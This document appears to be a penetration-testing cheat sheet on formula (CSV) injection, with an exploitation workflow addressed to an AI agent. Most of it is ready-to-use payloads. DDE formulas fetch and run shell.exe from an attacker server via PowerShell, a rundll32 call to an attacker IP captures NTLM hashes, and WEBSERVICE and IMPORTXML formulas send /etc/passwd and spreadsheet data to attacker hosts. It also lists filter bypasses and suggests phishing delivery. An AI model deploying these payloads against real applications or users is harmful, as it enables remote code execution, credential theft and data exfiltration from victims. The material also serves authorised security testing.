# Formula Injection (CSV Injection)

> **Summary**: Injection of spreadsheet formulas into data that is exported to CSV, XLSX, or other formats opened by spreadsheet applications, leading to code execution or data exfiltration when the file is opened.
> **Impact**: Arbitrary command execution on the victim's machine, data exfiltration from the spreadsheet, credential theft via NTLM relay, and phishing via malicious hyperlinks.
> **Typical Severity**: Medium | High (depending on user interaction and context)

---

## Detection

### Indicators
- User-controlled input that ends up in downloadable CSV/XLSX/ODS exports
- Application features that export data to spreadsheets (user lists, reports, invoices, logs)
- Fields like names, descriptions, comments, or addresses that accept special characters
- Any feature where user input is reflected in a cell without sanitization

### Automated Detection
```bash
# Test by submitting formula payloads in every input field and triggering export
# Check if the exported file contains the raw formula or if it has been sanitized

# Nuclei template for CSV injection
nuclei -u https://<TARGET> -t csv-injection.yaml

# Burp Suite: submit =cmd|'/C calc'!A0 in all text fields, then trigger CSV export
```

### Manual Detection
1. Identify any feature that allows data export (CSV, Excel, Google Sheets)
2. Submit payloads starting with `=`, `+`, `-`, `@`, `\t`, `\r` in user-input fields
3. Trigger the export functionality and download the file
4. Open the exported file and check if the formula is interpreted by the spreadsheet application
5. Check if the application prepends a single quote (`'`) or escapes formula-triggering characters

---

## Exploitation

### Prerequisites
- User input reflected in exported spreadsheet files (CSV, XLSX, ODS)
- The victim opens the exported file in a spreadsheet application (Excel, LibreOffice, Google Sheets)
- Spreadsheet application has DDE or external content enabled (for RCE payloads)
- For data exfiltration: outbound HTTP requests from the spreadsheet application are not blocked

### Step-by-Step

1. **Identify export functionality** -- Find any feature that exports user data to CSV/spreadsheet
   - Success: application offers a CSV/Excel download containing user-supplied data
2. **Inject a basic formula** -- Submit `=1+1` in a text field, trigger export, open the file
   - Success: the cell shows `2` instead of the literal string `=1+1`
3. **Test DDE payload** -- Submit `=cmd|'/C calc'!A0` and export
   - Success: calculator opens when the victim opens the file and accepts the prompt (Excel)
4. **Test hyperlink exfiltration** -- Submit `=HYPERLINK("http://<ATTACKER_SERVER>/"&A1&B1, "Click")` to exfiltrate adjacent cell data
   - Success: clicking the link sends cell data to the attacker server
5. **Test OOB exfiltration (Google Sheets)** -- Submit `=IMPORTXML("http://<ATTACKER_SERVER>/?d="&A1, "//a")`
   - Success: Google Sheets fetches the attacker URL with exfiltrated data

### Payloads

#### DDE (Dynamic Data Exchange) -- Excel
```
=cmd|'/C calc'!A0
=cmd|'/C powershell IEX(wget http://<ATTACKER_SERVER>/shell.exe)'!A0
=cmd|'/C powershell Invoke-WebRequest "http://<ATTACKER_SERVER>/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
DDE("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|'/C calc'!A0
=10+20+cmd|'/C calc'!A0
=cmd|'/C rundll32.exe \\<ATTACKER_IP>\share\payload.dll,0'!_xlbgnm.A1
```

#### Hyperlink-Based Exfiltration -- Excel
```
=HYPERLINK("http://<ATTACKER_SERVER>/steal?data="&A1&","&B1, "Click here")
```

#### LibreOffice Calc -- LFI and Exfiltration
```
# Read local file
='file:///etc/passwd'#$passwd.A1

# Exfiltrate via HTTP
=WEBSERVICE(CONCATENATE("http://<ATTACKER_SERVER>:8080/",('file:///etc/passwd'#$passwd.A1)))

# Multi-line exfiltration
=WEBSERVICE(CONCATENATE("http://<ATTACKER_SERVER>/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))

# DNS exfiltration
=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<ATTACKER_DOMAIN>"))
```

#### Google Sheets -- OOB Data Exfiltration
```
=IMPORTXML(CONCAT("http://<ATTACKER_SERVER>/?v=",CONCATENATE(A2:E2)),"//a/a10")
=IMPORTFEED(CONCAT("http://<ATTACKER_SERVER>/?v=",CONCATENATE(A2:E2)))
=IMPORTHTML(CONCAT("http://<ATTACKER_SERVER>/?v=",CONCATENATE(A2:E2)),"table",1)
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/<SHEET_ID>","sheet1!A2:E2")
=IMAGE("http://<ATTACKER_SERVER>/track.png")
```

#### Trigger Characters
```
=    (formula prefix)
+    (interpreted as formula in some apps)
-    (interpreted as formula in some apps)
@    (interpreted as formula in some apps)
\t=  (tab followed by equals, bypasses some filters)
\r=  (carriage return followed by equals)
```

### Proof of Concept
```http
POST /api/users HTTP/1.1
Host: <TARGET>
Content-Type: application/json

{"name": "=cmd|'/C calc'!A0", "email": "test@test.com", "role": "user"}
```

Then trigger the user export feature (e.g., `GET /admin/export/users.csv`), download and open the file in Excel.

---

## Bypasses

- **Tab prefix**: `\t=cmd|'/C calc'!A0` -- tab before the formula may bypass string-start checks
- **Carriage return prefix**: `\r=cmd|'/C calc'!A0`
- **UTF-8 BOM**: Prepend `\xEF\xBB\xBF` before the formula
- **Newline injection**: `\n=cmd|'/C calc'!A0` -- line feed to start a new cell with a formula
- **Plus/minus prefix**: `+cmd|'/C calc'!A0` or `-cmd|'/C calc'!A0`
- **Semicolon separator abuse**: In locales using `;` as CSV delimiter, inject formulas across cell boundaries
- **Encoding tricks**: URL encode, double encode, or use Unicode equivalents for `=` and other trigger chars
- **Field wrapping bypass**: If the app wraps fields in quotes, inject `"=cmd|'/C calc'!A0` to break out

---

## Escalation

- **RCE via DDE**: Execute arbitrary commands on the victim's machine (requires user to accept Excel prompts)
- **NTLM hash theft**: Use `=cmd|'/C rundll32.exe \\<ATTACKER_IP>\share\x.dll,0'!A0` to trigger an SMB connection and capture NTLM hashes with Responder
- **Lateral data exfiltration**: Use IMPORTRANGE to pull data from other spreadsheets the victim has access to
- **LFI on LibreOffice**: Read local files from the victim's system via `'file:///etc/passwd'`
- **Phishing**: Create convincing hyperlinks that appear legitimate but point to attacker-controlled sites
- **Chain with [XSS](xss.md)**: If the exported data is also rendered in a web view, formula injection may overlap with XSS
- **Chain with [Command Injection](command-injection.md)**: DDE payloads directly execute OS commands

---

## Tools

| Tool | Usage |
|------|-------|
| Burp Suite | Intercept requests, inject formula payloads in parameters destined for CSV export |
| [CSV Injection Payloads](https://github.com/payloadbox/csv-injection-payloads) | Comprehensive wordlist of CSV injection payloads |
| Responder | `responder -I eth0` -- capture NTLM hashes from SMB connections triggered by DDE payloads |
| Excel / LibreOffice | Open exported files to validate formula execution |
| Google Sheets | Test OOB exfiltration functions (IMPORTXML, IMPORTFEED, IMAGE) |

---

## Agent Workflow
> Step-by-step instructions for an AI agent to test for formula/CSV injection.

### Phase 1: Discovery
1. Identify all features that export data to CSV, XLSX, ODS, or other spreadsheet formats (user lists, reports, invoices, logs, transaction history).
2. Identify which user-controlled input fields end up in the exported file (names, descriptions, comments, addresses, custom fields).
3. Check if the application sanitizes formula-triggering characters (`=`, `+`, `-`, `@`, `\t`, `\r`) on input or on export.

### Phase 2: Validation
1. Submit `=1+1` in a text field that will be exported. Trigger the export and open the file.
   - If the cell shows `2` instead of the literal string `=1+1`, formula injection is confirmed.
2. Submit `=cmd|'/C calc'!A0` (DDE payload) and export. Open in Excel.
   - If a DDE prompt appears or calculator launches (after accepting prompts), DDE is exploitable.
3. Test with `+`, `-`, `@` prefixes as alternative formula triggers.
4. Test HYPERLINK exfiltration: `=HYPERLINK("http://<ATTACKER_SERVER>/"&A1, "Click")`.

### Phase 3: Exploitation
1. **DDE command execution (Excel)**: `=cmd|'/C <COMMAND>'!A0` -- executes OS commands when the victim opens the file and accepts prompts.
2. **HYPERLINK data exfiltration**: `=HYPERLINK("http://<ATTACKER_SERVER>/steal?data="&A1&","&B1, "Click here")` -- exfiltrates adjacent cell data when the victim clicks the link.
3. **LibreOffice LFI**: `='file:///etc/passwd'#$passwd.A1` -- reads local files on the victim's machine.
4. **Google Sheets OOB**: `=IMPORTXML(CONCAT("http://<ATTACKER_SERVER>/?v=",CONCATENATE(A2:E2)),"//a/a10")` -- Google Sheets fetches the attacker URL with exfiltrated cell data.
5. **NTLM hash theft**: `=cmd|'/C rundll32.exe \\<ATTACKER_IP>\share\x.dll,0'!A0` -- triggers SMB connection for NTLM hash capture.

### Phase 4: Escalation
1. **RCE via DDE**: Execute arbitrary commands on the victim's machine (requires user to accept Excel prompts).
2. **NTLM relay**: Capture NTLM hashes with Responder from SMB connections triggered by DDE payloads.
3. **Lateral data exfiltration**: Use IMPORTRANGE in Google Sheets to pull data from other spreadsheets the victim has access to.
4. **LFI on LibreOffice**: Read local files from the victim's system via `file://` references.
5. Chain with phishing: deliver the exported file via email to maximize victim interaction.

## Decision Tree

```
Start: Identify CSV/spreadsheet export functionality
  |
  +---> User input appears unsanitized in exported cells?
  |       +---> Yes: Test =1+1 --> Does cell evaluate the formula?
  |       |       +---> Yes: Formula injection confirmed
  |       |       +---> No: Application sanitizes on export (prepends quote)
  |       +---> Sanitized: Try bypass (\t=, \r=, +, -, @)
  |
  +---> Target opens in Excel?
  |       +---> DDE: =cmd|'/C calc'!A0 --> Command execution
  |       +---> HYPERLINK: Exfiltrate cell data via HTTP
  |       +---> NTLM: Trigger SMB connection for hash capture
  |
  +---> Target opens in LibreOffice?
  |       +---> LFI: ='file:///etc/passwd'#$passwd.A1
  |       +---> WEBSERVICE: Exfiltrate via HTTP
  |
  +---> Target opens in Google Sheets?
          +---> IMPORTXML/IMPORTFEED: OOB exfiltration
          +---> IMAGE: Tracking/callback
```

## Success Criteria
- [ ] Export functionality identified with user-controlled data in cells
- [ ] Formula evaluation confirmed (=1+1 shows 2 in exported file)
- [ ] DDE payload triggers command execution or prompt in Excel
- [ ] If data exfiltration: cell data sent to attacker server via HYPERLINK or IMPORTXML
- [ ] If LFI: local file contents read via LibreOffice formula
- [ ] If NTLM: hash captured via Responder from SMB connection

## References

- [HackTricks - Formula/CSV/Doc/LaTeX/GhostScript Injection](https://book.hacktricks.wiki/pentesting-web/formula-csv-doc-latex-ghostscript-injection.html)
- [Not So Secure - Data Exfiltration via Formula Injection](https://notsosecure.com/data-exfiltration-formula-injection-part1)
- [Payatu - CSV Injection Basic to Exploit](https://payatu.com/csv-injection-basic-to-exploit)
- [CSV Injection Payloads (GitHub)](https://github.com/payloadbox/csv-injection-payloads)
- Related: [XSS](xss.md), [Command Injection](command-injection.md)
